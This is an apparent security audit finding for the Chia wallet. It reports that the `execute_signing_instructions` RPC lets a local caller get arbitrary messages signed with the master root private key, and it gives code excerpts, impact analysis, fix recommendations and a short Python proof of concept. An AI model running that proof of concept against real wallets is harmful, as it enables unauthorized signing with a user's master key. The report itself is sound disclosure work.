### Title
Master Root Private Key Used to Sign Arbitrary Messages via `execute_signing_instructions` RPC — (`chia/wallet/wallet.py`)

### Summary

`execute_signing_instructions` unconditionally places the wallet's master root private key into `sk_lookup` at initialization. Any RPC caller can submit a `SigningTarget` whose fingerprint equals the root pubkey fingerprint, causing the wallet to sign an attacker-chosen message with the master root private key. No guard prevents the root key from being used as a direct signing target.

### Finding Description

In `Wallet.execute_signing_instructions`, `sk_lookup` is initialized as:

```python
sk_lookup: dict[int, PrivateKey] = (
    {root_pubkey.get_fingerprint(): self.wallet_state_manager.get_master_private_key()}
    if self.wallet_state_manager.private_key is not None
    else {}
)
``` [1](#0-0) 

The root master private key is keyed by its fingerprint in `sk_lookup` from the very start of the function. Later, the target-processing loop does:

```python
elif pk_fingerprint in sk_lookup:
    responses.append(
        SigningResponse(
            bytes(AugSchemeMPL.sign(sk_lookup[pk_fingerprint], target.message)),
            target.hook,
        )
    )
``` [2](#0-1) 

There is no guard that prevents the root fingerprint from being used as a direct `SigningTarget` fingerprint. If an attacker submits `SigningTarget(fingerprint=root_pk.get_fingerprint().to_bytes(4,'big'), message=<arbitrary>, hook=<any>)`, the wallet calls `AugSchemeMPL.sign(root_sk, arbitrary_message)` and returns the signature.

The RPC handler for this endpoint performs no additional authorization beyond the mutual TLS check:

```python
@marshal
async def execute_signing_instructions(
    self,
    request: ExecuteSigningInstructions,
) -> ExecuteSigningInstructionsResponse:
    return ExecuteSigningInstructionsResponse(
        signing_responses=await self.service.wallet_state_manager.execute_signing_instructions(
            request.signing_instructions, request.partial_allowed
        )
    )
``` [3](#0-2) 

The endpoint is registered at `/execute_signing_instructions` with no role-based or key-scope restriction. [4](#0-3) 

### Impact Explanation

Any process that can reach the wallet RPC (i.e., holds the private SSL CA certificate, which is stored on the local machine) can obtain a BLS signature from the master root private key over an arbitrary message. This violates the security invariant that only derived child keys should sign. The root key is the trust anchor for all child key derivation; exposing it as a signing oracle is a High-severity unauthorized key use.

**Correction to the claim's impact:** The assertion that this enables "derivation of all child keys via unhardened BLS key relationships" is incorrect. A BLS signing oracle does not reveal the private key scalar, so child keys cannot be derived from signatures alone. The actual impact is unauthorized signing with the master key, not full wallet compromise via key derivation.

### Likelihood Explanation

The RPC is protected by mutual TLS using the private CA. Any local process that can read `~/.chia/mainnet/config/ssl/` (the default location) can connect. On a multi-user system or a system with a compromised local process, this is reachable. The attack requires no special knowledge beyond the root pubkey fingerprint, which is publicly derivable from the mnemonic or observable from the wallet's own RPC responses.

### Recommendation

Remove the root master private key from `sk_lookup`. It should only be placed in `pk_lookup` (for sum-hint pubkey lookups). Child keys derived via path hints should be the only entries in `sk_lookup`. Alternatively, add an explicit guard in the target loop that rejects any `SigningTarget` whose fingerprint matches the root pubkey fingerprint.

### Proof of Concept

```python
import asyncio
from blspy import AugSchemeMPL, G1Element
from chia.wallet.signer_protocol import SigningInstructions, KeyHints, SigningTarget
from chia.wallet.wallet_request_types import ExecuteSigningInstructions
from chia.wallet.wallet_rpc_client import WalletRpcClient

async def poc():
    # Attacker knows root_pk fingerprint (observable from get_logged_in_fingerprint or public key)
    root_pk: G1Element = ...  # obtained from wallet RPC
    root_fingerprint = root_pk.get_fingerprint().to_bytes(4, 'big')
    arbitrary_message = b"attacker controlled message"

    client = await WalletRpcClient.create(...)
    resp = await client.execute_signing_instructions(
        ExecuteSigningInstructions(
            signing_instructions=SigningInstructions(
                key_hints=KeyHints(sum_hints=[], path_hints=[]),
                targets=[SigningTarget(
                    fingerprint=root_fingerprint,
                    message=arbitrary_message,
                    hook=bytes(32),
                )],
            ),
            partial_allowed=True,
        )
    )
    sig = resp.signing_responses[0].signature
    # Verify: signature is valid under root_pk
    assert AugSchemeMPL.verify(root_pk, arbitrary_message, sig)
    print("Root master key signed attacker message:", sig.hex())
```

The `sk_lookup` initialization at lines 548–552 guarantees the root fingerprint is present, and the target loop at lines 612–618 will sign without any additional check. [5](#0-4) [6](#0-5)
